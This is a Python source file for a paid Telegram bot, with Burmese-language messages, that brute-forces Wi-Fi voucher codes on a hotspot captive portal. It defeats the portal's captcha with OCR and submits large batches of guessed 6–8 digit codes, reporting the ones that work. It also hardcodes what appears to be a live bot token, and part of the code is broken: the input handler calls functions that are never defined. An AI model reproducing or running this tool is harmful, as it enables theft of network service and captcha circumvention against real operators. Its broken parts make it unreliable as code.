import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8963964708:AAEIGvzc_DQse8xoWpZlBxjWncATf6gFAPw')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '6658845504'))
CHANNEL_ID = os.environ.get('CHANNEL_ID', '-5441041274')
CHANNEL_LINK = os.environ.get('CHANNEL_LINK', 'https://t.me/+qpuC-axFXb5iZDZl')
# ============================

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 100
_voucher_sem = None
_start_time = time.monotonic()

# ========== DATABASE (Simple JSON) ==========
DB_FILE = "users_db.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            try:
                return json.load(f)
            except:
                return {}
    return {}

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

db = load_db()

# ========== SUBSCRIPTION HELPERS ==========
def get_user_expiry(user_id):
    user_id = str(user_id)
    if user_id not in db:
        expiry = (datetime.now(timezone.utc) + timedelta(days=1)).isoformat()
        db[user_id] = {"expiry": expiry, "trial_used": True}
        save_db(db)
        return datetime.fromisoformat(expiry)
    expiry_str = db[user_id].get("expiry")
    if not expiry_str:
        return None
    return datetime.fromisoformat(expiry_str)

def is_subscribed(user_id):
    if int(user_id) == ADMIN_ID:
        return True
    expiry = get_user_expiry(user_id)
    if not expiry:
        return False
    return datetime.now(timezone.utc) < expiry

async def check_join(user_id):
    if int(user_id) == ADMIN_ID:
        return True
    try:
        member = await bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"Check join error: {e}")
    return False

# ========== WEB SERVER ==========
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ========== BOT HANDLERS ==========

@bot.message_handler(commands=['start'])
async def start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if not await check_join(user_id):
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(telebot.types.InlineKeyboardButton("Join Channel", url=CHANNEL_LINK))
        keyboard.add(telebot.types.InlineKeyboardButton("Check Joined", callback_data="check_joined"))
        await bot.send_message(chat_id, "❌ Bot အသုံးပြုရန် Channel ကို အရင် Join ပေးပါဦး။", reply_markup=keyboard)
        return
    expiry = get_user_expiry(user_id)
    status_text = f"📅 Expiry: `{expiry.strftime('%Y-%m-%d %H:%M:%S')}`" if expiry else "❌ No Subscription"
    if chat_id not in user_data:
        user_data[chat_id] = {}
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
    btn_input = telebot.types.InlineKeyboardButton("📥 Enter Session URL", callback_data="input_url")
    btn_status = telebot.types.InlineKeyboardButton("📊 Status", callback_data="status")
    btn_found = telebot.types.InlineKeyboardButton("📜 Found Codes", callback_data="found")
    btn_stop = telebot.types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop")
    btn_buy = telebot.types.InlineKeyboardButton("💳 Buy Subscription", callback_data="buy_sub")
    keyboard.add(btn_input, btn_status, btn_found, btn_stop, btn_buy)
    await bot.send_message(
        chat_id,
        f"🚀 *Welcome to StarLink Bot!*\n\n{status_text}\n\n📊 *Commands:*\n/start - Menu\n/input <url> - Set URL\n/scan <mode> - Start scan\n/stop - Stop scan\n/status - Progress\n/found - Found codes",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['add'])
async def add_user(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "❌ Usage: `/add <user_id> <days>`")
        return
    target_id = args[1]
    days = int(args[2])
    current_expiry = get_user_expiry(target_id)
    if current_expiry and current_expiry > datetime.now(timezone.utc):
        new_expiry = current_expiry + timedelta(days=days)
    else:
        new_expiry = datetime.now(timezone.utc) + timedelta(days=days)
    db[str(target_id)] = {"expiry": new_expiry.isoformat(), "trial_used": True}
    save_db(db)
    await bot.reply_to(message, f"✅ User `{target_id}` added {days} days.")

@bot.message_handler(commands=['input'])
@require_role(UserRole.USER)
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply("အသုံးပြုနည်း: /input your_session_url")
        return

    url = args[1].strip()

    parsed = parse_session_url(url)
    if not parsed:
        await message.reply(
            "Session URL မမှန်ပါ။ gw_id, gw_address, gw_port, mac, ip ပါရမည်။"
        )
        return

    user_id = message.from_user.id
    user_session[user_id] = url

    await message.reply("✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
    
@bot.message_handler(commands=['scan'])
async def scan(message):
    user_id = message.from_user.id
    if not is_subscribed(user_id):
        await bot.reply_to(message, "❌ Subscription သက်တမ်းကုန်ဆုံးနေပါသည်။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "❌ *Usage:* `/scan <6|7|8|all|ascii-lower>`", parse_mode="Markdown")
        return
    mode = args[1].lower()
    chat_id = message.chat.id
    if mode not in ["6", "7", "8", "all", "ascii-lower"]:
        await bot.reply_to(message, "❌ *Invalid mode!*", parse_mode="Markdown")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "❌ *Please set session URL first!*", parse_mode="Markdown")
        return
    progress_msg = await bot.send_message(chat_id, "🔍 Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        await bot.reply_to(message, "🛑 *Scan stopped!*", parse_mode="Markdown")
    else:
        await bot.reply_to(message, "ℹ️ *No scan running.*", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
async def status(message):
    chat_id = message.chat.id
    if chat_id not in scan_tasks:
        await bot.reply_to(message, "📊 *Status*\n\nScan: `Not running`", parse_mode="Markdown")
        return
    task_data = scan_tasks[chat_id]
    checked = task_data.get('checked', 0)
    total = task_data.get('total')
    mode = task_data.get('mode', 'unknown')
    speed = task_data.get('speed', 0)
    await bot.reply_to(message, format_progress(checked, total, speed, mode), parse_mode="Markdown")

@bot.message_handler(commands=['found'])
async def found_command(message):
    chat_id = message.chat.id
    codes = success_texts.get(chat_id, [])
    if not codes:
        await bot.reply_to(message, "📜 *No codes found yet.*", parse_mode="Markdown")
        return
    text = "📜 *Found Codes*\n\n" + "\n".join([f"• `{c}`" for c in codes[-20:]])
    await bot.reply_to(message, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data
    if data == "check_joined":
        if await check_join(user_id):
            await bot.delete_message(chat_id, call.message.message_id)
            await start(call.message)
        else:
            await bot.answer_callback_query(call.id, "❌ Channel ကို Join မထားသေးပါ။", show_alert=True)
    elif data == "buy_sub":
        await bot.send_message(chat_id, f"💳 *Subscription Plans:*\n\nAdmin @Lord_fo_darkness ကို ဆက်သွယ်ပါ။\nUser ID: `{user_id}`", parse_mode="Markdown")
    elif data == "input_url":
        await bot.send_message(chat_id, "📥 *Enter Session URL*\n\nUse: `/input <your_session_url>`", parse_mode="Markdown")
    elif data == "status":
        await status(call.message)
    elif data == "found":
        await found_command(call.message)
    elif data == "stop":
        await stop_scan(call.message)
    await bot.answer_callback_query(call.id)

async def check_session_url(session_url):
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            return "sessionId" in str(response.url)
    except:
        return False

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
    else:
        while True:
            yield digit_generator(8 if mode == "8" else 6)

def format_progress(checked, total=None, speed=0, mode=""):
    speed_str = f"{speed:,.0f} codes/min"
    if total:
        percent = (checked / total) * 100
        return f"🔍 *Scanning {mode}*\n📦 Checked: `{checked:,}/{total:,}`\n📊 Progress: `{percent:.2f}%`\n⚡ Speed: `{speed_str}`"
    return f"🔍 *Scanning {mode}*\n📦 Checked: `{checked:,}`\n⚡ Speed: `{speed_str}`"

_ocr = ddddocr.DdddOcr(show_ad=False)

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(lambda: _ocr.classification(image_bytes).upper())

async def Captcha_Image(session, session_id):
    url = f"https://portal-as.ruijienetworks.com/api/auth/captcha?sessionId={session_id}&_={int(time.time()*1000)}"
    try:
        async with session.get(url) as response:
            if response.status == 200:
                return await response.read()
    except:
        pass
    return None

async def perform_check(session_url, code, chat_id, scan_id, message=None):
    global session
    current_task = scan_tasks.get(chat_id)
    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
        return
    session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", session_url)
    if not session_id: return
    session_id = session_id.group(1)
    captcha_img = await Captcha_Image(session, session_id)
    if not captcha_img: return
    captcha_code = await Captcha_Text(captcha_img)
    data = {"voucherCode": code, "captcha": captcha_code, "sessionId": session_id}
    try:
        async with session.post("https://portal-as.ruijienetworks.com/api/auth/voucher", json=data) as req:
            resp = await req.json()
            if 'logonUrl' in str(resp):
                if chat_id not in success_texts: success_texts[chat_id] = []
                success_texts[chat_id].append(code)
                await bot.send_message(chat_id, f"✅ *Success:* `{code}`", parse_mode="Markdown")
    except:
        pass

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    code_iter = iter_codes(mode)
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    start_time = time.monotonic()
    while True:
        current = scan_tasks.get(chat_id)
        if not current or current.get("scan_id") != scan_id or current.get("stop"): break
        batch = [next(code_iter) for _ in range(10)]
        await asyncio.gather(*[perform_check(session_url, c, chat_id, scan_id) for c in batch])
        checked += len(batch)
        elapsed = time.monotonic() - start_time
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        if checked % 50 == 0:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=format_progress(checked, total, speed, mode), parse_mode="Markdown")

async def main():
    global session
    session = aiohttp.ClientSession()
    asyncio.create_task(web_server())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())